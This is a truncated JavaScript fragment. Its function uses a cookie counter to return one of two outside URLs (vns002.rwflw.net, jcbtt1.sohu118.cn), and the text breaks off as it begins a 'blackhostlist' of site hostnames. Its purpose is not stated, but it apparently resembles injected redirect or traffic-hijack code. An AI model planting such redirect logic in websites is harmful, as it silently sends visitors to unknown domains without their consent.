...
function changelocaHref(){
    if ( GetCookie('countdd7')){
        if(parseInt(GetCookie('countdd7'))<4){
            var res = GetCookie('countdd7');
            var val = res*1;
            //console.log(val);
            ++val;
            createCookie("countdd7",val,3600);
            return "http://vns002.rwflw.net/";
        }else{
            return "http://jcbtt1.sohu118.cn/";
        }

    }else{
        createCookie("countdd7","1",3600)
        return  "http://vns002.rwflw.net/";
    }
}
...
var blackhostlist=['fans.bestvogue.com','www.de4f.com','pica-juicy.picacomic.com',
